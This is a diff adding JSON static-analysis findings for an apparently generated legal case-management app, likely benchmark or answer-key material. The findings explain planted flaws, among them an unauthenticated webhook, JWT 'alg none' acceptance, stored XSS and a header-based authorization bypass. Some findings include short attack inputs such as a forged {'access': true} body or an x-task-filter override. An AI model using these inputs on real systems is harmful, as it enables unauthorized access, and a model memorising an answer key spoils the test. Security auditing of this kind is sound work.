+      "check_id": "javascript.security.authentication.unauthenticated-conflict-vendor-webhook",
+      "path": "generated-legal-case-remix/app/routes/api.clients.$clientId.conflict-vendor-status.ts",
+      "start": {
+        "line": 6,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 20,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "This action performs no authentication, signature, or shared-secret verification at all before calling applyConflictVendorVerdict(). The underlying function (app/lib/conflict-vendor-status.ts:8-26) additionally treats any truthy `result.access` value in the JSON body as a clearance and parses the tier header with a loose `parseInt` (accepting garbage). Any unauthenticated network caller can POST `{\"access\": true}` to `/api/clients/:clientId/conflict-vendor-status` to flip a conflicted client's status back to 'active', clearing a real conflict-of-interest flag.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-807: Reliance on Untrusted Inputs in a Security Decision"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authentication.jwt-alg-none-accepted",
+      "path": "generated-legal-case-remix/app/lib/practice-management-sync.ts",
+      "start": {
+        "line": 47,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 51,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "verifyClosureConfirmation() calls jwt.verify() with `algorithms: [\"HS256\", \"none\"]`, so a JWT with header `{\"alg\":\"none\"}` and an empty signature is accepted as authentic without knowledge of PM_SYNC_SIGNING_SECRET (which additionally defaults to the empty string when unset, line 7). This function is used by app/routes/api.billing-confirmation.ts:21 and app/routes/api.partner-handshake-billing.ts:14 to authenticate partner-system callbacks \u2014 the latter mints an access-key cookie from the forged claims. An attacker can forge an unsigned assertion for any `matterId`/`status` to spoof billing-confirmation callbacks and obtain a valid partner access-key cookie. The sibling verifyDocketConfirmation() correctly restricts to `[\"HS256\"]` and throws if the secret is unconfigured.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.credentials.hardcoded-legacy-gateway-key",
+      "path": "generated-legal-case-remix/app/lib/practice-management-sync.ts",
+      "start": {
+        "line": 12,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 66,
+        "offset": 0
+      },
+      "extra": {
+        "message": "LEGACY_GATEWAY_KEY is a static, hardcoded API key committed to source and used directly as a Bearer token in notifyLegacyGatewayOfClosure() (called from production matter-closure code at app/routes/_app.matters.$matterId.edit.tsx:59). Anyone with source access has a permanent, non-rotatable credential for the legacy billing gateway.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.firm-wide-document-search-no-visibility-filter",
+      "path": "generated-legal-case-remix/app/lib/document-search.ts",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchAllDocuments() queries prisma.document.findMany() across every matter with no visibility/ownership filter and no result cap, returning metadata for internal_only and privileged documents regardless of the requester's matter assignment. Called from app/routes/api.documents.search.ts:6-13, gated only by role (firm_admin/attorney/paralegal) \u2014 any user in those roles can enumerate privileged document metadata for matters they have no assignment to, inconsistent with the canViewDocument visibility model enforced elsewhere in the app. The unbounded result set is also a resource-exhaustion risk. The safe sibling searchAllDocumentsSafely paginates but still lacks the visibility filter \u2014 neither variant restores per-matter access control.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-770: Allocation of Resources Without Limits or Throttling"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.task-filter-header-authorization-bypass",
+      "path": "generated-legal-case-remix/app/routes/_app.tasks._index.tsx",
+      "start": {
+        "line": 16,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 25,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyAdvancedTaskFilter() parses the `x-task-filter` request header as JSON and spreads it over the role-scoped `where` clause (`{ ...where, ...advanced }`) with no key allow-list, applied at line 51 before the task query executes. Because object spread lets later keys overwrite earlier ones, a caller can send a header such as `{\"matter\":{}}` or `{\"OR\":undefined}` to overwrite the `matter`/`OR` keys that scope a client or paralegal to only their own tasks (set at lines 34-41), letting them enumerate every firm's tasks. The equivalent deadlines board (_app.deadlines._index.tsx) instead allow-lists only the `title` field for its advanced filter.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.stored-xss-matter-notes",
+      "path": "generated-legal-case-remix/app/routes/_app.matters.$matterId.notes.tsx",
+      "start": {
+        "line": 168,
+        "col": 17,
+        "offset": 0
+      },
+      "end": {
+        "line": 171,
+        "col": 19,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Note content is rendered via `dangerouslySetInnerHTML={{ __html: renderNoteBody(n.content) }}`, and renderNoteBody() (app/lib/note-formatting.ts:4-9) performs no HTML escaping at all \u2014 it only substitutes `\\n`, `**`, and `*` for basic markdown-style formatting. Raw `<script>` or `<img onerror=...>` content submitted in a note (see the create-note action at lines 98-117, which accepts arbitrary `content` from any staff role) is rendered as live HTML to every subsequent viewer of that matter's notes. The sibling renderMessageBody() (note-formatting.ts:20-26) correctly escapes HTML first and is used identically for messages (_app.matters.$matterId.messages.tsx:209).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.misconfiguration.clickjacking-wildcard-frame-ancestors",
+      "path": "generated-legal-case-remix/app/lib/portal-embed.ts",
+      "start": {
+        "line": 6,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "configurePartnerCaseWidget() strips the X-Frame-Options header and sets `Content-Security-Policy: frame-ancestors *` for the `/portal/widget` route, allowing ANY origin on the web to iframe the client-facing case-status widget, which displays matter title/status. This enables clickjacking/UI-redress attacks against attorneys or clients viewing embedded case data. The adjacent configureFilingStatusWidget() correctly restricts frame-ancestors to 'self' plus a single configured trusted partner origin, showing this wildcard is a real misconfiguration rather than intentional design.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1021: Improper Restriction of Rendered UI Layers or Frames ('Clickjacking')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.header-injection.content-disposition-unsanitized-filename",
+      "path": "generated-legal-case-remix/app/lib/document-export.ts",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 9,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildExportDisposition() builds the Content-Disposition header value by directly interpolating `label` with no sanitization of CR/LF or quote characters. It is used at app/routes/api.documents.$documentId.download.ts:50,64 with `exportLabel` taken from the `?export_label=` query parameter. While the Fetch Headers implementation typically rejects raw CR/LF, an unescaped double-quote in the label can break out of the `filename=\"...\"` attribute. The safe sibling buildExportDispositionSafely strips `\\r\\n` from the label but not quotes either, and is unused by this route regardless.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
